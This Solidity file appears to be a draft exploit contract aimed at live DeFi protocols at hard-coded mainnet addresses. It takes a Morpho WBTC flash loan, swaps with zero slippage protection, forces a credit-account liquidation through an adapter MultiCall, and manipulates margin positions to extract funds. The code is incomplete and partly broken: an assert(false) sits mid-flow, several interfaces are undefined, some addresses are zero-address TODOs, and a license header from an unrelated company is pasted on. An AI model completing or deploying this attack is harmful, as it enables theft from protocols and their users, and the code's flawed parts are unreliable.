/**
 * SPDX-License-Identifier: Apache-2.0
 *
 * Copyright (c) 2023, Circle Internet Financial, LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface ERC20{
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
    function withdraw( uint requestedAmount) external;
    function deposit() external payable;
    function totalSupply() external view returns (uint256);
}

interface Mopho{
       function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IERC721{
    function transferFrom(address from, address to, uint256 tokenId) external;
}

// MultiCall 结构体定义
struct MultiCall {
    address target;
    bytes callData;
}

// CreditFacadeV3 接口
interface ICreditFacadeV3 {
    function liquidateCreditAccount(
        address creditAccount,
        address to,
        MultiCall[] calldata calls
    ) external;
}

// CreditManagerV3 接口（用于获取 adapter 映射）
interface ICreditManagerV3 {
    function adapterToContract(address adapter) external view returns (address);
}

contract SFWbtcs{
    address public owner;
    address public WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address public USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address public WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address public mam = 0x7E859C254F431e566DaaB65f49b2449Aa826E395;
    address public mtr = 0x35CB6a3b4963DaE3CB7465c954DDFBE0cd13eb2b;
    address public tr = 0xd3fdE5AF30DA1F394d6e0D361B552648D0dff797;
    address public account = 0x5c479762C8Fe57B6D874893a4B4932B40F612580;
    address public pool = 0x20D96638DA7B7e8FD7B78427EA49048d4A847946;
    address public uniswapV3Pool = 0xC6962004f452bE9203591991D15f6b388e09E8D0;
    address public swapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address public quoter = 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6;
    address public aave = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address public fi =0x839fBa840df186cAd94411f0D66E308e7102Ef1e;
    address public positionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address public mopho = 0x6c247b1F6182318877311737BaC0844bAa518F5e;
    
    // CreditFacadeV3 合约地址（需要根据实际情况设置）
    address public creditFacade = 0x0000000000000000000000000000000000000000; // TODO: 设置实际的 CreditFacadeV3 地址
    address public creditManager = 0x0000000000000000000000000000000000000000; // TODO: 设置实际的 CreditManagerV3 地址
    
    // Adapter 地址
    address public adapter = 0x9515AB9BB73A9642F1a93Ba7C2790e9d08227f9a;

    constructor(){
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    function withdrawERC721(address token, uint256 tokenId) public onlyOwner {
        IERC721(token).transferFrom(address(this), msg.sender, tokenId);
    }

    function withdrawERC20(address token, uint256 amount) public onlyOwner {
        ERC20(token).transfer(msg.sender, amount);
    }


    function fuck() public{
        ERC20(WBTC).transferFrom(msg.sender, address(this), 1600001);
        Mopho(mopho).flashLoan(WBTC, 36*1e8, "");
        console.log("WBTC ", ERC20(WBTC).balanceOf(address(this)));
    }

    function mint() public{
        
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external{
        console.log("onMorphoFlashLoan");
            uint marginAccountID = MAM(mam).createMarginAccount();
            ERC20(WBTC).approve(pool, type(uint256).max);
            ERC20(WBTC).approve(mtr, type(uint256).max);
 
            console.log("WBTC ", ERC20(WBTC).balanceOf(address(this)));

            ERC20(WBTC).approve(swapRouter, type(uint256).max);
            ERC20(USDC).approve(swapRouter, type(uint256).max);

            ISwapRouter.ExactInputParams memory batchParams = ISwapRouter.ExactInputParams({
                path: abi.encodePacked(WBTC, uint24(500), USDC),
                recipient: address(this),
                deadline: block.timestamp + 300,
                amountIn: 35*1e8,
                amountOutMinimum: 0
            });
            ISwapRouter(swapRouter).exactInput(batchParams);
            console.log("WBTC ", ERC20(WBTC).balanceOf(address(this)));
            
            // 调用 CreditFacadeV3 的 liquidateCreditAccount 函数
            _liquidateCreditAccount();
            
            assert(false);
            
            Pool(pool).provide(3*1e7);
            console.log("marginAccountID ", marginAccountID);
            MTRouter(mtr).provideERC20(marginAccountID, WBTC, 1600000);
            TradeRouter(tr).increaseShortPosition(marginAccountID, WBTC, 3*1e7);
            Pool(pool).withdraw(ERC20(pool).balanceOf(address(this)));

            ISwapRouter.ExactInputParams memory batchParams2 = ISwapRouter.ExactInputParams({
                path: abi.encodePacked(USDC, uint24(500), WBTC),
                recipient: address(this),
                deadline: block.timestamp + 300,
                amountIn: ERC20(USDC).balanceOf(address(this)),
                amountOutMinimum: 0
            });
            ISwapRouter(swapRouter).exactInput(batchParams2);

            console.log("WBTC ", ERC20(WBTC).balanceOf(account));
            ERC20(WBTC).approve(msg.sender, type(uint256).max);
    }

    /**
     * @notice 调用 CreditFacadeV3 的 liquidateCreditAccount 函数
     * @dev 创建一个 MultiCall 用于调用 adapter，实现外部调用
     * @dev 调用 adapter 的 exchange_diff(0,1,1,0) 函数
     */
    function _liquidateCreditAccount() internal {
        // 要清算的 credit account 地址（需要根据实际情况设置）
        address creditAccountToLiquidate = 0x81AF467CDf226E32945F974A44d209a47f433002; // TODO: 设置实际的 credit account 地址
        
        // 接收清算收益的地址
        address to = address(this); // 或者设置为其他地址
        
        // 准备 adapter 调用的 callData
        // 调用 exchange_diff(0,1,1,0)
        // 函数签名为: exchange_diff(uint256,uint256,uint256,uint256)
        bytes memory callData = abi.encodeWithSignature(
            "exchange_diff(uint256,uint256,uint256,uint256)",
            0,
            1,
            1,
            0
        );
        
        // 创建 MultiCall 结构体数组
        MultiCall[] memory calls = new MultiCall[](1);
        calls[0] = MultiCall({
            target: adapter,           // adapter 地址: 0x9515AB9BB73A9642F1a93Ba7C2790e9d08227f9a
            callData: callData         // 调用数据: exchange_diff(0,1,1,0)
        });
        
        // 调用 CreditFacadeV3 的 liquidateCreditAccount
        console.log("准备调用 liquidateCreditAccount");
        console.log("CreditAccount:", creditAccountToLiquidate);
        console.log("Adapter:", adapter);
        console.log("To:", to);
        console.log("CallData (exchange_diff(0,1,1,0))");
        
        // 获取 adapter 对应的实际合约地址（可选，用于验证）
        address actualTarget = ICreditManagerV3(creditManager).adapterToContract(adapter);
        console.log("Adapter对应的实际合约地址:", actualTarget);
        
        ICreditFacadeV3(creditFacade).liquidateCreditAccount(
            creditAccountToLiquidate,
            to,
            calls
        );
        
        console.log("liquidateCreditAccount 调用完成");
    }


    receive() external payable { 

    }
    

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4){
        return this.onERC721Received.selector;
    }


}